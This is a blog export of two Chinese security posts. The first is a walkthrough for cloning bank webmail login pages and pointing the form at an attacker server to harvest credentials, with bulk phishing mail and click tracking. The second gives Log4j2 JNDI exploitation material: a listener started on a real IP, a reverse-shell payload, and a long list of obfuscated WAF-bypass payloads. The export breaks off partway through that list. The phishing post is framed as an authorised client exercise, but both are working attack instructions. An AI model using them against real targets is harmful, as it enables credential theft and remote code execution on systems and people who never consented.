<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>网站克隆钓账密</title>
      <link href="2022/01/25/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/"/>
      <url>2022/01/25/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>起因是客户有个模拟账密钓鱼的业务需求，奈何自己是条菜狗，本来想着用gophish实现，试了几个互联网目标发现效果不太理想，去现场一试果然傻眼。实际上gophish绝大多数情况下并非仅通过Import就能够达到理想下的克隆。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">163邮箱失败，可以克隆，提交登录提示网络请求错误，无法记录账密。https:&#x2F;&#x2F;mail.163.com&#x2F;</span><br><span class="line"></span><br><span class="line">qq邮箱失败，访问克隆页面跳转qq邮箱界面。https:&#x2F;&#x2F;mail.qq.com&#x2F;</span><br><span class="line"></span><br><span class="line">广州银行企业邮箱成功，克隆页面、账密记录，点击定位http:&#x2F;&#x2F;mail.gzcb.com.cn&#x2F;webmail&#x2F;login&#x2F;login.do</span><br><span class="line"></span><br><span class="line">台州coremail邮箱失败，无法克隆。https:&#x2F;&#x2F;mail.tzbank.com&#x2F;</span><br><span class="line"></span><br><span class="line">徽商coremail失败，无法克隆。https:&#x2F;&#x2F;mail.hsbank.com.cn&#x2F;</span><br><span class="line"></span><br><span class="line">烟台银行成功 https:&#x2F;&#x2F;mail.yantaibank.net&#x2F;coremail&#x2F;index.jsp</span><br><span class="line"></span><br><span class="line">中国农业发展银行成功 https:&#x2F;&#x2F;mail.adbc.com.cn&#x2F;</span><br><span class="line"></span><br><span class="line">浙江稠州商业银行失败https:&#x2F;&#x2F;mail.czcb.com.cn&#x2F;</span><br><span class="line"></span><br><span class="line">东莞农村商业银行企业邮箱coremail失败 https:&#x2F;&#x2F;mail.drcbank.com&#x2F;</span><br><span class="line"></span><br><span class="line">盛京银行邮件系统失败 乱码，无法记录账密 https:&#x2F;&#x2F;mail.shengjingbank.com.cn&#x2F;</span><br></pre></td></tr></table></figure><p>我滴超人欧婉鑫大佬登场！</p><h2 id="网站克隆"><a href="#网站克隆" class="headerlink" title="网站克隆"></a>网站克隆</h2><p>先访问网站然后使用ctrl+s保存，本地打开访问一下</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125152906874.png" alt="image-20220125152906874"></p><p>本地是用file协议访问的，但是打开后立马跳转到https协议了，编辑器打开html页面，找到关键代码然后修改</p><p>前</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125153054589.png" alt="image-20220125153054589"></p><p>后</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125162729681.png" alt="image-20220125162729681"></p><p>把第一个https改成file然后再用file协议打开就不会跳转https，后面上线时肯定要改成http。</p><h3 id="修改数据接收服务器"><a href="#修改数据接收服务器" class="headerlink" title="修改数据接收服务器"></a>修改数据接收服务器</h3><p>在输⼊框标签处修改属性action，把action值改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;服务器IP:9888&#x2F;mail&#x2F;login</span><br></pre></td></tr></table></figure><p>搜了一下发现有两个action</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125160300100.png" alt="image-20220125160300100"></p><p>登录一下发现用的是第二个，那就改第二个，后面都改的是第二个</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125160329093.png" alt="image-20220125160329093"></p><p>前</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125160430920.png" alt="image-20220125160430920"></p><p>后</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125160535143.png" alt="image-20220125160535143"></p><h3 id="增加传输参数"><a href="#增加传输参数" class="headerlink" title="增加传输参数"></a>增加传输参数</h3><p>在⽤户名密码接收框标签下再增加⼀句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;id&quot; value&#x3D;&quot;location.href&quot; id&#x3D;&quot;location-href&quot;&gt;</span><br></pre></td></tr></table></figure><p>前</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125160947435.png" alt="image-20220125160947435"></p><p>后</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125161012196.png" alt="image-20220125161012196"></p><p>增加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;JavaScript&quot;&gt;</span><br><span class="line">const locationHrefInput &#x3D; document.getElementById(&#39;location-href&#39;);</span><br><span class="line">locationHrefInput.value &#x3D; location.href;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>前</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125161252323.png" alt="image-20220125161252323"></p><p>后</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125161316232.png" alt="image-20220125161316232"></p><p>增加该段js后再访问html就会出现一个ca窗口</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125161442744.png" alt="image-20220125161442744"></p><p>找到该段div删除</p><p>前</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125161559851.png" alt="image-20220125161559851"></p><p>后</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125161617880.png" alt="image-20220125161617880"></p><p>发现ca窗口没了，登录框也没了</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125161720110.png" alt="image-20220125161720110"></p><p>因为是每修改一步，就会刷新html页面一次查看效果，所以很容易知道是该段js的问题。之前这段js是放在密码框下，测试放登录框下，登录框就不会消失。</p><p>前</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125161949489.png" alt="image-20220125161949489"></p><p>后</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125162044663.png" alt="image-20220125162044663"></p><p>登录按钮又出现了</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125162108296.png" alt="image-20220125162108296"></p><p>另外要修改html中用户名、密码的name和id。</p><p>用户名都用username，密码都用password。</p><p>前</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125162409994.png" alt="image-20220125162409994"></p><p>后</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125162436747.png" alt="image-20220125162436747"></p><p>前</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125162456809.png" alt="image-20220125162456809"></p><p>后</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125162459245.png" alt="image-20220125162459245"></p><p>服务器要搭建apache中间件，把上面文件传到web路径下，保证上面页面能用http访问即可，要求可以开放80和9888端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -F</span><br></pre></td></tr></table></figure><p>访问发现很多404文件，从原网站下载相关文件放到克隆服务器上对应的web路径下。</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125165908266.png" alt="image-20220125165908266"></p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125170210854.png" alt="image-20220125170210854"></p><p>再访问效果就会好很多</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125170150521.png" alt="image-20220125170150521"></p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220125170405107.png" alt="image-20220125170405107"></p><p>左上角还有个图标不正常，查看元素发现是在这里，在克隆服务器上新建相同的目录，然后找到源文件传上去即可</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127100400718.png" alt="image-20220127100400718"></p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127100534887.png" alt="image-20220127100534887"></p><p>现在效果就比较nice了，之前效果就是做到这一步，登录框那里还有点瑕疵</p><p>原版</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127101755199.png" alt="image-20220127101755199"></p><p>改版</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127101831010.png" alt="image-20220127101831010"></p><p>对完线继续，图标彭老版研究出来怎么替换了，以头像为例。</p><p><a href="https://www.iconfont.cn/%E7%BD%91%E7%AB%99%E6%90%9C%E5%A4%B4%E5%83%8F%E7%84%B6%E5%90%8E%E5%8A%A0%E5%85%A5%E8%B4%AD%E7%89%A9%E8%BD%A6%EF%BC%8C%E4%B8%8B%E8%BD%BD%E4%BB%A3%E7%A0%81%E3%80%82">https://www.iconfont.cn/网站搜头像然后加入购物车，下载代码。</a></p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127164316834.png" alt="image-20220127164316834"></p><p>下载之后是这些内容</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127164343148.png" alt="image-20220127164343148"></p><p>全部复制到files中，已有就替换。</p><p>打开iconfont.css找到图标名，把以前的图标名改为下载好的图标名即可。</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127164601724.png" alt="image-20220127164601724"></p><p>前</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127164622321.png" alt="image-20220127164622321"></p><p>后</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127164657128.png" alt="image-20220127164657128"></p><p>全部改完的效果</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127170528187.png" alt="image-20220127170528187"></p><h2 id="监听配置"><a href="#监听配置" class="headerlink" title="监听配置"></a>监听配置</h2><p>本来到这步想着写文章把效果整完美点，研究了下是用FontClass的方式，不过还是没成功，接着往下写吧</p><p>运行大佬给的pyc文件，pyc文件是由py文件经过编译后生成的文件，看不到明文内容，后面跟的数字就是要求的版本，比如这下面给的pyc文件就只能py37能运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00.http_data_flask.cpython-37.pyc&#x2F;&#x2F;克隆服务器监听，9888端口就这个文件开启的</span><br><span class="line">access_logv2.1.1.cpython-37.pyc&#x2F;&#x2F;日志分析</span><br><span class="line">emali_sendsv2.1.cpython-37.pyc&#x2F;&#x2F;邮件发送</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install flask</span><br></pre></td></tr></table></figure><p>运行00.http_data_flask.cpython-37.pyc后直接登录会返回500，要符合特定格式的url才可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.16.243&#x2F;index.html?id&#x3D;b%27YWE&#x3D;%27&amp;aa  &#x2F;&#x2F;第一个参数中间是base64加密的，这个base64将是经过加密的邮箱地址，用于记录点击，第二个是标签，这些会有邮件来设定，邮件发送的钓鱼链接也是这样的格式</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127144904924.png" alt="image-20220127144904924"></p><p>这样才算成功钓鱼</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127145139373.png" alt="image-20220127145139373"></p><p>并没有登录成功，只是一个提示。然后00.http_data_flask.cpython-37.pyc所在目录下会生成一个login.log文件，里面记录了登录的账密。这个是密码md5版，也有非md5版的。</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127145309954.png" alt="image-20220127145309954"></p><h2 id="邮件配置"><a href="#邮件配置" class="headerlink" title="邮件配置"></a>邮件配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install PyEmail</span><br></pre></td></tr></table></figure><p>邮件脚本包含以下内容</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127145831519.png" alt="image-20220127145831519"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">emali_sendsv2.0.cpython-37.pyc 邮件发送程序</span><br><span class="line">mail.json 邮件发送程序相关配置</span><br><span class="line">mail_body.txt 邮件内容正⽂</span><br><span class="line">mail_sign.txt 邮件签名</span><br><span class="line">targetmail_list.txt 收件箱列表</span><br><span class="line">sends_error.txt 发送出错邮箱列表</span><br><span class="line">sends_success.txt 发送成功邮箱列表</span><br></pre></td></tr></table></figure><p>邮件正文mail_body.txt</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127150203229.png" alt="image-20220127150203229"></p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127150219159.png" alt="image-20220127150219159"></p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127171758765.png" alt="image-20220127171758765"></p><p>收件箱列表targetmail_list.txt。sends_error.txt和sends_success.txt和该文件类似，发送成功邮件会在sends_success.txt显示。发送失败邮件会在sends_error.txt显示。</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127150332232.png" alt="image-20220127150332232"></p><p>邮件签名mail_sign.txt</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127150901171.png" alt="image-20220127150901171"></p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127150912662.png" alt="image-20220127150912662"></p><p>发邮件账户配置文件mail.json，要开启自己163邮箱smtp那啥，会给一个码，就是配置文件里面的PWD</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127152526542.png" alt="image-20220127152526542"></p><p>最终效果</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127152703069.png" alt="image-20220127152703069"></p><h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>apache开启日志记录，找到日志文件access_log，运行pyc文件，生成linkclick.log文件，里面就是点击记录。</p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127152908000.png" alt="image-20220127152908000"></p><p><img src="/../../../../images/%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E9%92%93%E8%B4%A6%E5%AF%86/image-20220127153005051.png" alt="image-20220127153005051"></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用163发的邮件,比如发50封邮件，每发第9封时邮件系统会自动等待1分钟再发。测试时发了400封，准备了3个邮箱发。</span><br><span class="line">建议把自己邮箱写target第一个。</span><br><span class="line">会有不少退信。</span><br></pre></td></tr></table></figure><p>本来还能再细写点，尼玛的太难了，都1.27了还被程序员拉去对线。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 钓鱼 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2代码执行漏洞</title>
      <link href="2022/01/19/log4j2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>2022/01/19/log4j2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>影响范围</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Jedis</span><br><span class="line">Logging</span><br><span class="line">Logstash</span><br><span class="line">HikariCP</span><br><span class="line">Hadoop Hive</span><br><span class="line">ElasticSearch</span><br><span class="line">Apache Solr</span><br><span class="line">Apache Struts2</span><br><span class="line">Apache Flink</span><br><span class="line">Apache Druid</span><br><span class="line">Apache Log4j SLF4J  Binding</span><br><span class="line">spring-boot-strater-log4j2</span><br><span class="line">Camel :: Core</span><br><span class="line">JBoss  Logging 3</span><br><span class="line">JUnit Vintage Engine</span><br><span class="line">WSO2 Carbon Kernel  Core</span><br><span class="line">vmware</span><br><span class="line"></span><br><span class="line">更多组件可参考如下链接：</span><br><span class="line">https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;org.apache.logging.log4j&#x2F;log4j-core&#x2F;usages?p&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap:&#x2F;&#x2F;9e735f2d.dns.1433.eu.org&#x2F;xxxxxx&#125;&#x2F;&#x2F;dnslog检测</span><br><span class="line">https:&#x2F;&#x2F;gitee.com&#x2F;bjmlw2021&#x2F;JNDIExploit &#x2F;&#x2F;回显工具</span><br><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -p 9090 -i 23.91.97.29  &#x2F;&#x2F;启动回显监听</span><br><span class="line">$&#123;jndi:ldap:&#x2F;&#x2F;23.91.97.29:1389&#x2F;Basic&#x2F;TomcatEcho&#125;&#x2F;&#x2F;payload</span><br><span class="line">ldap:&#x2F;&#x2F;127.0.0.1:1389&#x2F;Basic&#x2F;ReverseShell&#x2F;[ip]&#x2F;[port]  ---windows NOT supported &#x2F;&#x2F;反弹shell，这fofa靶场貌似不支持</span><br></pre></td></tr></table></figure><p><img src="/../../../../images/log4j2%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220119165403575.png" alt="image-20220119165403575"></p><p>burp被动扫描检测插件：<a href="https://github.com/Jeromeyoung/log4j2burpscanner">https://github.com/Jeromeyoung/log4j2burpscanner</a></p><p>变形</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;$&#123;$&#123;::-j&#125;ndi:ldap:&#x2F;&#x2F;1.2.3.4:1234&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line">payload&#x3D;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:ldap:&#x2F;&#x2F;1.2.3.4:1234&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line">payload&#x3D;$&#123;$&#123;lower:jndi&#125;:ldap:&#x2F;&#x2F;1.2.3.4:1234&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line">payload&#x3D;$&#123;$&#123;lower:jndi&#125;:$&#123;lower:LDAP&#125;:&#x2F;&#x2F;1.2.3.4:1234&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line">payload&#x3D;$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:LDAP&#125;:&#x2F;&#x2F;1.2.3.4:1234&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line">payload&#x3D;$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:LDAP&#125;:&#x2F;&#x2F;1.2.3.4:1234&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line">payload&#x3D;$&#123;jndi:$&#123;lower:LDAP&#125;:&#x2F;&#x2F;1.2.3.4:1234&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload&#x3D;$&#123;jndi:$&#123;lowEr:LDAP&#125;:&#x2F;&#x2F;1.2.3.4:1234&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line">payload&#x3D;$&#123;$&#123;sys:sun.cpu.isalist&#125;jndi:$&#123;lower:LDAP&#125;:&#x2F;&#x2F;1.2.3.4:1234&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line">payload&#x3D;$&#123;$&#123;sys:sun.cpu.isalist&#125;j$&#123;sys:sun.cpu.isalist&#125;n$&#123;sys:sun.cpu.isalist&#125;d$&#123;sys:sun.cpu.isalist&#125;i$&#123;sys:sun.cpu.isalist&#125;:$&#123;lower:LDAP&#125;:&#x2F;&#x2F;1.2.3.4:1234&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line">payload&#x3D;$&#123;$&#123;sys:sun.cpu.isalist&#125;j$&#123;sys:sun.cpu.isalist&#125;n$&#123;sys:sun.cpu.isalist&#125;d$&#123;sys:sun.cpu.isalist&#125;i$&#123;sys:sun.cpu.isalist&#125;$&#123;sys:path.separator&#125;$&#123;lower:LDAP&#125;:&#x2F;&#x2F;1.2.3.4:1234&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line">payload&#x3D;$&#123;$&#123;sys:sun.cpu.isalist&#125;j$&#123;sys:sun.cpu.isalist&#125;n$&#123;sys:sun.cpu.isalist&#125;d$&#123;sys:sun.cpu.isalist&#125;i$&#123;sys:sun.cpu.isalist&#125;$&#123;sys:path.separator&#125;$&#123;lower:LDAP&#125;$&#123;sys:path.separator&#125;$&#123;sys:file.separator&#125;$&#123;sys:file.separator&#125;1.2.3.4:1234&#x2F;TomcatBypass&#x2F;TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line">payload&#x3D;$&#123;$&#123;sys:sun.cpu.isalist&#125;j$&#123;sys:sun.cpu.isalist&#125;n$&#123;sys:sun.cpu.isalist&#125;d$&#123;sys:sun.cpu.isalist&#125;i$&#123;sys:sun.cpu.isalist&#125;$&#123;sys:path.separator&#125;$&#123;lower:LDAP&#125;$&#123;sys:path.separator&#125;$&#123;sys:file.separator&#125;$&#123;sys:file.separator&#125;1.2.3.4:1234$&#123;sys:file.separator&#125;TomcatBypass$&#123;sys:file.separator&#125;TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line">payload&#x3D;$&#123;$&#123;sys:sun.cpu.isalist&#125;j$&#123;sys:sun.cpu.isalist&#125;n$&#123;sys:sun.cpu.isalist&#125;d$&#123;sys:sun.cpu.isalist&#125;i$&#123;sys:sun.cpu.isalist&#125;$&#123;sys:path.separator&#125;$&#123;lower:LDAP&#125;$&#123;sys:path.separator&#125;$&#123;sys:file.separator&#125;$&#123;sys:file.separator&#125;1$&#123;sys:sun.cpu.isalist&#125;.2$&#123;sys:sun.cpu.isalist&#125;.3$&#123;sys:sun.cpu.isalist&#125;.4$&#123;sys:sun.cpu.isalist&#125;$&#123;sys:path.separator&#125;1234$&#123;sys:file.separator&#125;TomcatBypass$&#123;sys:file.separator&#125;TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span 